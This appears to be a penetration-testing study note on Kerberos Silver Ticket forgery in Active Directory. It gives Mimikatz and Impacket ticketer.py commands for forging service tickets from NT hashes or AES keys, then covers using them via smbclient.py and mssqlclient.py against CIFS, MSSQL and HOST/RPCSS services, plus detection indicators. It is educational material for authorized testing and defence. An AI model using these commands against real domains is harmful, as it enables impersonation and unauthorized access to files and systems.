
A **Silver Ticket** is a forged Kerberos **Ticket Granting Service (TGS)** ticket for a specific service.

Unlike a Golden Ticket, which uses the `krbtgt` account's secret to forge a TGT, a Silver Ticket uses the **NT hash or AES key of the account running the target service**.

```text
Service Account Hash / AES Key
            ↓
       Forge TGS
            ↓
   Impersonate User
            ↓
    Target Service
```

The attack is useful when the attacker has compromised a service account, computer account, or gMSA and wants to authenticate to a specific service without knowing the impersonated user's password.

> **Important:** Silver Tickets are service-specific. The forged ticket does not provide unrestricted Kerberos access to the entire domain.

---

# Create a Silver Ticket

Mimikatz's ticket-forging command is:
```text
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /user:<USER> /service:<SERVICE> /target:<TARGET> /rc4:<SERVICE_ACCOUNT_NT_HASH>
```

Example:
```text
kerberos::golden /domain:controller.local \
/sid:S-1-5-21-... \
/user:Administrator \
/service:cifs \
/target:server1.controller.local \
/rc4:<SERVICE_ACCOUNT_NT_HASH>
```

Important parameters:

|Option|Meaning|
|---|---|
|`/domain`|AD domain|
|`/sid`|Domain SID|
|`/user`|User to impersonate|
|`/service`|Target Kerberos service|
|`/target`|Target server|
|`/rc4`|NT hash of the service account|
|`/aes256`|AES-256 key of the service account|

Mimikatz can generate a forged `.kirbi` service ticket.

---

# Modern AES-Based Silver Ticket

Modern environments increasingly prefer **AES** over RC4.

Use the AES-256 key when the target service/account requires AES:
```text
kerberos::golden /domain:<DOMAIN> \
/sid:<DOMAIN_SID> \
/user:<USER> \
/service:<SERVICE> \
/target:<TARGET> \
/aes256:<AES256_KEY>
```

For example:
```text
kerberos::golden /domain:thm.loc \
/sid:S-1-5-21-... \
/user:Administrator \
/service:cifs \
/target:server1.thm.loc \
/aes256:<AES256_KEY>
```

**Key point:**
```text
RC4 / NT Hash
     ↓
May fail when RC4 is disabled

AES256 Key
     ↓
Preferred for AES-enabled environments
```

If the service account is restricted to AES, possessing only its NT hash is not sufficient for forging an RC4 Silver Ticket.

---

# Create a Silver Ticket Remotely

Using Impacket `ticketer.py`:

### AES-256
```bash
ticketer.py \
-aesKey <AES256_KEY> \
-domain-sid <DOMAIN_SID> \
-domain <DOMAIN> \
-spn cifs/<TARGET_FQDN> \
Administrator
```

Tool path:
```text
/home/eyad/.local/share/pipx/venvs/impacket/bin
```

- `-aesKey` → AES key of the service account.
- `-domain-sid` → Domain SID.
- `-domain` → AD domain.
- `-spn` → Target service's SPN.
- `Administrator` → User represented by the forged ticket.

Output:
```text
Administrator.ccache
```

### RC4 / NT Hash
```bash
ticketer.py \
-nthash <SERVICE_ACCOUNT_NT_HASH> \
-domain-sid <DOMAIN_SID> \
-domain <DOMAIN> \
-spn cifs/<TARGET_FQDN> \
Administrator
```

`-nthash` is appropriate only when the target environment/service accepts RC4.

---

# Use the Forged Ticket

```bash
export KRB5CCNAME=Administrator.ccache
```

This tells Kerberos-aware tools to use the forged `.ccache`.

### Authenticate to SMB
```bash
smbclient.py <DOMAIN>/Administrator@<TARGET_FQDN> \
-k -no-pass -dc-ip <DC_IP>
```

- `-k` → Use Kerberos.
- `-no-pass` → Don't request a password.
- `-dc-ip` → Specify the domain controller.
- **FQDN required** → Kerberos uses the SPN to identify the service.
    

---

# Common Silver Ticket Services

|Service|SPN|Typical Access|
|---|---|---|
|SMB|`cifs/<host>`|File shares / PsExec|
|HOST|`host/<host>`|Host-related operations|
|HTTP|`http/<host>`|HTTP-based Kerberos services|
|WinRM|`wsman/<host>` / `HTTP/<host>`|PowerShell Remoting|
|WMI|`HOST` + `RPCSS`|WMI operations|
|MSSQL|`MSSQLSvc/<host>:1433`|SQL Server|
|LDAP|`ldap/<dc>`|LDAP operations|

The exact service and permissions depend on the target environment.

---

# CIFS Silver Ticket

CIFS is one of the most common Silver Ticket targets.

A forged CIFS ticket can be used to authenticate to SMB services:
```text
Service Account Key
        ↓
Forge CIFS TGS
        ↓
Administrator.ccache
        ↓
Kerberos → CIFS
        ↓
SMB Access
```

For example:
```bash
ticketer.py \
-aesKey <AES256_KEY> \
-domain-sid <DOMAIN_SID> \
-domain <DOMAIN> \
-spn cifs/server1.<DOMAIN> \
Administrator
```

Then:
```bash
export KRB5CCNAME=Administrator.ccache
```

And authenticate:
```bash
smbclient.py <DOMAIN>/Administrator@server1.<DOMAIN> \
-k -no-pass -dc-ip <DC_IP>
```

If the impersonated identity has sufficient authorization on the target, this may provide access to administrative shares such as:
```text
\\server1\C$
\\server1\ADMIN$
```

---

# MSSQL Silver Ticket

A Silver Ticket can also target an MSSQL service.

Example:
```bash
ticketer.py \
-aesKey <SQLSVC_AES256> \
-domain-sid <DOMAIN_SID> \
-domain <DOMAIN> \
-spn MSSQLSvc/<HOST_FQDN>:1433 \
Administrator
```

Then:
```bash
export KRB5CCNAME=Administrator.ccache
```

Connect using Kerberos:
```bash
mssqlclient.py -k -no-pass \
<DOMAIN>/Administrator@<HOST_FQDN>:1433
```

If the resulting SQL context has sufficient privileges, SQL Server functionality such as `xp_cmdshell` may provide operating-system command execution.

The resulting OS context depends on the SQL Server service account's privileges.

---

# HOST / RPCSS

Silver Tickets targeting `HOST` and `RPCSS` can be relevant to remote Windows management functionality.

Potentially affected functionality includes:
```text
HOST + RPCSS
      ↓
     WMI
      ↓
Remote command execution
```

Other Windows management services can similarly depend on Kerberos service tickets.

**Important:** Possessing a valid Silver Ticket does not automatically mean you have administrator privileges. The target service still evaluates the authorization associated with the ticket.

---

# Silver Ticket vs Golden Ticket

|Golden Ticket|Silver Ticket|
|---|---|
|Forges a **TGT**|Forges a **TGS**|
|Uses `krbtgt` secret|Uses target service account secret|
|Can be used to request tickets for many services|Targets a specific service|
|Domain-wide potential|Service-specific|
|Requires `krbtgt` compromise|Requires target service account compromise|

### Golden Ticket
```text
KRBTGT Hash
     ↓
Forge TGT
     ↓
Request/access multiple services
```

### Silver Ticket
```text
Service Account Hash/AES Key
     ↓
Forge TGS
     ↓
Specific Service
```

---

# Silver Ticket Requirements

To forge a Silver Ticket, you generally need:

```text
1. Domain SID
2. Target service SPN
3. Service account NT hash or AES key
4. Target domain
5. Identity to impersonate
```

Example:
```text
Domain SID
    +
Service Account AES Key
    +
CIFS SPN
    ↓
Forge TGS
    ↓
Administrator
    ↓
CIFS on TARGET
```

---

# Detection

Silver Tickets can be harder to detect than Golden Tickets because the forged TGS can be presented directly to the target service without obtaining a normal TGT from the KDC.

Useful Windows events include:

|Event ID|Meaning|
|---|---|
|`4624`|Successful logon|
|`4634`|Logoff|
|`4672`|Special privileges assigned|
|`4768`|TGT requested|
|`4769`|TGS requested|

A notable indicator is a service accepting a Kerberos ticket without the expected preceding KDC activity.

Other suspicious indicators include:
- Unexpected service-account usage.
- Unusual encryption types.
- RC4 usage in an environment enforcing AES.
- Abnormally long ticket lifetimes.
- Service access that does not match the account's normal behavior.
    

---

# Persistence

Silver Tickets can provide persistence as long as the compromised **service account secret remains valid**.

For example:
```text
Compromise Service Account
          ↓
Obtain Service Account Key
          ↓
Forge Silver Ticket
          ↓
Authenticate to Service
```

However, if the service account password/key changes, previously forged tickets based on the old secret will no longer work.

Computer accounts and gMSAs can rotate their secrets automatically, so their current keys are important when performing authorized testing.

---

# Key Takeaways

- **Silver Ticket = forged TGS.**
    
- Requires the **target service account's secret**, not `krbtgt`.
    
- Can impersonate another identity to the targeted service.
    
- **Service-specific**, unlike a Golden Ticket.
    
- `CIFS` is a common target for SMB access.
    
- `HOST`/`RPCSS` can be relevant to Windows management services.
    
- `MSSQLSvc` can target SQL Server.
    
- **AES keys are preferred** in modern environments where RC4 is disabled.
    
- The forged ticket does **not automatically grant administrator privileges**; the target service still performs authorization.
    
- Service/account key rotation invalidates tickets forged with the previous key.